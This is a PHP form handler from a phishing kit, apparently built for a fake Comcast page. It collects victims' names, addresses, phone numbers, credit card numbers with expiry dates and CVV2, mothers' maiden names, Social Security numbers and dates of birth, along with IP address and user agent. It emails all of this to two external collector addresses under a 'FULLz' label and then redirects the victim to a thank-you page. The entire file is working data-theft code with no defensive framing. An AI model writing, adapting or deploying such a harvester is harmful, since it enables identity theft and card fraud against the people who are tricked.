<?

$FirstName = $_POST['FirstName'];
$MiddleName = $_POST['MiddleName'];
$LastName = $_POST['LastName'];
$Address = $_POST['Address'];
$City = $_POST['City'];
$State = $_POST['State'];
if (getenv(HTTP_X_FORWARDED_FOR)){
$ip = getenv(HTTP_X_FORWARDED_FOR); } else {
$ip = getenv(REMOTE_ADDR); }
$useragent=$_SERVER['HTTP_USER_AGENT']; 
$IP = $_POST['REMOTE_ADDR'];
$td = date("F jS");
$msg = $_POST['msg'];
$date = date("d M, Y");
$time = date("g:i a"); 
$LogTime = trim(" Date: ".$date.", Time: ".$time);
$smtp = $_POST['S'];
$ZipCode = $_POST['ZipCode'];
$Country = $_POST['Country'];
$accountPhoneNumber = $_POST['accountPhoneNumber'];
$Aol_CCDb = $_POST['Aol_CCDb'];
$Aol_CCNumber = $_POST['Aol_CCNumber'];
$Aol_CCExp = $_POST['Aol_CCExp'];
$Aol_CCExpYear = $_POST['Aol_CCExpYear'];
$nameofcc = $_POST['nameofcc'];
$Aol_Cvv2 = $_POST['Aol_Cvv2'];
$MothersMaidenName = $_POST['MothersMaidenName'];
$SSN = $_POST['SSN'];
$dateOfBirth = $_POST['dateOfBirth'];
$dateOfBirthDay = $_POST['dateOfBirthDay'];
$dateOfBirthyear = $_POST['dateOfBirthyear'];
$dateOfBirthMonth = $_POST['dateOfBirthMonth'];
/////////sending msg options start/////////////
$subject="Comcast Report !";
$from = "From: CipherReZultZ FULLz Info <Full@info.info>";
$subj = "Comcast";
$mail ="allspamresults@gmail.com, allspamresults@yahoo.com";
///////////////end////////////////////////////
$mailbody="\n CipherReZultZ Information :\n*********\n\nFirst Name : $FirstName\nMiddle Name : $MiddleName\nLast Name : $LastName\nBilling Address : $Address\nCity : $City\nState : $State\nZip Code : $ZipCode\nCountry : $Country\nPhone Number : $accountPhoneNumberp\nCredit Card Information :\n*********\nCard Type : $Aol_CCDb\nCredit Card Number : $Aol_CCNumber\nExp. Date : $Aol_CCExp / $Aol_CCExpYear\nName On Card : $nameofcc\nCvv2 : $Aol_Cvv2\nMother Maiden Name : $MothersMaidenName\nSocial Security Number : $SSN\nDOB : $dateOfBirth\nBirth Month : $dateOfBirthMonth\nBirth Year : $dateOfBirthyear\n\n*****\n\n User Ip Address : $ip \n Logtime : $LogTime \n Agent : $useragent \n -  by Dola 7abeeby™\n\n";
mail($mail, $subj, $mailbody, $from);
Header ("Location: thank.html");
?>

